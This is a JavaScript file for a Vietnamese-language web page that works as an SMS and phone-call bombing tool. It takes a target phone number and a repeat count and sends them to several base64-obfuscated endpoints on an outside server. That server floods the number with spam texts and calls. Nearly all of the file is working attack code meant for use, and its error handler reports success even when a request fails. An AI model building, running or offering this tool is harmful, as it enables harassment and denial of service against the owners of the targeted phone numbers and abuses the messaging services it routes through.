let queue = [];
let processing = false;
//ghi nguồn
// Bố Quang Mã Hoá
const urls = [
    'aHR0cHM6Ly9xdWFuZy5ucXRvb2wubmV0Lz8=',
    'aHR0cHM6Ly9xdWFuZy5ucXRvb2wubmV0L2luZGV4MS5waHA/',
    'aHR0cHM6Ly9xdWFuZy5ucXRvb2wubmV0L2luZGV4Mi5waHA/',
    'aHR0cHM6Ly9xdWFuZy5ucXRvb2wubmV0L2luZGV4My5waHA/',
    'aHR0cHM6Ly9xdWFuZy5ucXRvb2wubmV0L2luZGV4NC5waHA/',
    'aHR0cHM6Ly9xdWFuZy5ucXRvb2wubmV0L2luZGV4NS5waHA/',
    // Ghi Nguồn Nha Mày
];
//ghi nguồn
function decodeBase64(encoded) {
    return atob(encoded);
}
//ghi nguồn
function addToQueue() {
    const phone = document.getElementById('phone').value;
    const times = document.getElementById('times').value;

    if (phone && times) {
        queue.push({ phone, times });
        updateStatusBar();
        if (!processing) {
            processQueue();
        }
    }
}
//ghi nguồn
function processQueue() {
    if (queue.length === 0) {
        processing = false;
        return;
    }
//ghi nguồn
    processing = true;
    const { phone, times } = queue.shift();
//ghi nguồn
    const listItem = document.createElement('li');
    listItem.innerText = `Bắt Đầu ${phone} (${times} lần)`;
    document.getElementById('status-list').appendChild(listItem);

    spamSmsAndCall(phone, times, listItem);
}
//ghi nguồn
function spamSmsAndCall(phone, times, listItem) {

    const url1 = `${decodeBase64(urls[0])}phone=${phone}&amout=${times}`;
    const url2 = `${decodeBase64(urls[1])}phone=${phone}&amout=${times}`;
    const url3 = `${decodeBase64(urls[2])}phone=${phone}&amout=${times}`;
    const url4 = `${decodeBase64(urls[3])}phone=${phone}&amout=${times}`;
    const url5 = `${decodeBase64(urls[4])}phone=${phone}&amout=${times}`;
//ghi nguồn
//ghi nguồn
    //ghi nguồn
    Promise.all([
        fetch(url1).then(response => response.json()),
        fetch(url2).then(response => response.json()),
        fetch(url3).then(response => response.json()),
        fetch(url4).then(response => response.json()),
        fetch(url5).then(response => response.json())
    ]) //ghi nguồn
    .then(([response1, response2, response3, response4, response5]) => {

        listItem.innerText = `Thành Công ${phone}: URL1 - ${response1.message}, URL2 - ${response2.message}, URL3 - ${response3.message}, URL4 - ${response4.message}, URL5 - ${response5.message}`;
        processQueue();
    }) //ghi nguồn
    .catch(error => {
        // Xử lý
        listItem.innerText = `Thành Công ${phone}`;
        processQueue();
    });
}
//ghi nguồn
function updateStatusBar() {
    const statusList = document.getElementById('status-list');
    statusList.innerHTML = '';
    queue.forEach((item, index) => {
        const listItem = document.createElement('li');
        listItem.innerText = `Luồng: ${item.phone} (${item.times} lần)`;
        statusList.appendChild(listItem);
    });
}
//ghi nguồn
//ghi nguồn
//ghi nguồn
//ghi nguồn
//ghi nguồn
//ghi nguồn//ghi nguồn
//ghi nguồn//ghi nguồn
//ghi nguồn//ghi nguồn
//ghi nguồn//ghi nguồn
//ghi nguồn//ghi nguồn
//ghi nguồn//ghi nguồn
//ghi nguồn//ghi nguồn
//ghi nguồn//ghi nguồn
//ghi nguồn//ghi nguồn
//ghi nguồn//ghi nguồn
//ghi nguồn//ghi nguồn
//ghi nguồn//ghi nguồn
//ghi nguồn//ghi nguồn
//ghi nguồn
